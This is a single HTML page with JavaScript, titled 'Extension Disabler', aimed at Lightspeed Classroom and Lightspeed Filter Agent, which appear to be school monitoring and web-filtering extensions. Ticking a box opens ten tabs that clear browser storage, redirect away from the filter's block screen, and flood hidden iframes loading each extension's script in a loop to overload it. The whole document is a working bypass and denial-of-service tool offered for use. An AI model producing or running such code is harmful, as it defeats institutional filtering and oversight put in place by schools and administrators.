<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Extension Disabler</title>
    <style>
        .extension-container {
            margin: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .extension-checkbox {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div id="div-container"></div>

    <script>
        const extensions = {
            "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/main.js",
            "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/main.js",
            // Add more extensions here
        };

        const extContainer = document.getElementById("div-container");

        function createExtensionCheckboxes() {
            for (const [name, url] of Object.entries(extensions)) {
                const div = document.createElement("div");
                div.classList.add("extension-container");

                const checkbox = document.createElement("input");
                checkbox.type = "checkbox";
                checkbox.id = name;
                checkbox.classList.add("extension-checkbox");

                const label = document.createElement("label");
                label.htmlFor = name;
                label.textContent = name;

                div.appendChild(checkbox);
                div.appendChild(label);
                extContainer.appendChild(div);
            }
        }

        function handleCheckboxChange(event) {
            const extName = event.target.id;
            const extUrl = extensions[extName];

            if (event.target.checked) {
                disableExtension(extName, extUrl, true);
            } else {
                console.log(`Extension ${extName} re-enabled.`);
            }
        }

        function disableExtension(extName, mainJSURL, isAggressive = false) {
            const numTabs = 10; // Example value
            const maxIframes = isAggressive ? 100000 * 100 : 100000; // Example value

            for (let tab = 0; tab < numTabs; tab++) {
                let printerWindow = window.open("", "_blank");
                printerWindow.document.title = 'Disable';
                printerWindow.document.body.style.backgroundColor = '#1e1f22';

                let counterContainer = printerWindow.document.createElement("div");
                counterContainer.style.color = "white";
                counterContainer.style.fontFamily = "monospace";
                counterContainer.style.padding = "20px";
                printerWindow.document.body.appendChild(counterContainer);

                let script = printerWindow.document.createElement("script");
                script.innerHTML = `
                    localStorage.clear();
                    sessionStorage.clear();

                    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.reload) {
                        chrome.runtime.reload();
                    }

                    function bypassBlockScreen() {
                        const blockScreenURL = 'https://lsrelay-config-production.s3.amazonaws.com/';
                        if (window.location.href.includes(blockScreenURL)) {
                            const originalURL = new URLSearchParams(window.location.search).get('url');
                            if (originalURL) {
                                window.location.href = originalURL;
                            }
                        }
                    }

                    setInterval(bypassBlockScreen, 100);

                    const batchSize = 100000;
                    let totalIframes = 0;
                    let reloadCount = 0;

                    function createIframes() {
                        for (let i = 0; i < batchSize; i++) {
                            const iframe = document.createElement('iframe');
                            iframe.src = '${mainJSURL}';
                            iframe.style.display = 'none';
                            document.body.appendChild(iframe);
                            totalIframes++;
                        }

                        counterContainer.innerHTML = \`
                            <h1>${extName}</h1>
                            <p>Total Iframes: \${totalIframes}</p>
                            <p>Reload Count: \${reloadCount}</p>
                        \`;

                        setTimeout(() => {
                            reloadCount++;
                            document.body.innerHTML = '';
                            document.body.appendChild(counterContainer);
                            createIframes();
                        }, 5000);
                    }

                    createIframes();
                `;
                printerWindow.document.body.appendChild(script);
            }
        }

        document.addEventListener("DOMContentLoaded", function () {
            createExtensionCheckboxes();
            document.querySelectorAll(".extension-checkbox").forEach(checkbox => {
                checkbox.addEventListener("change", handleCheckboxChange);
            });
        });
    </script>
</body>
</html>